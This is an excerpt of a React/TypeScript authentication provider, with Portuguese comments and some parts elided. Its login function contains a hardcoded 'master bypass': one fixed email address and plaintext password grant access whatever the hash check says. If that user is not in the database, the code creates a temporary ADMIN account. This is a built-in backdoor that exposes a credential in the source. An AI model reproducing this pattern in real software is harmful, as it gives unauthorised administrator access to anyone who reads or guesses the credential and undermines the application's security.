...
export const AuthProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  ...
  const login = async (email: string, pass: string): Promise<boolean> => {
    ...
    // Regra de Ouro/Recuperação: john.lima@ham.org.br / Admin1
    const isMasterBypass = (cleanEmail === "john.lima@ham.org.br" && cleanPass === "Admin1");

    if (isHashMatch || isMasterBypass) {
      let userToLogin = dbUser;

      // Se entrou pelo bypass mas o usuário não existe no banco, cria ou usa um fake temporário
      if (isMasterBypass && !dbUser) {
        userToLogin = {
          id: crypto.randomUUID(),
          name: "Admin1",
          email: "john.lima@ham.org.br",
          role: "ADMIN" as any,
          password: inputHash
        };
        ...
        // Sincroniza hash se entrou pelo bypass
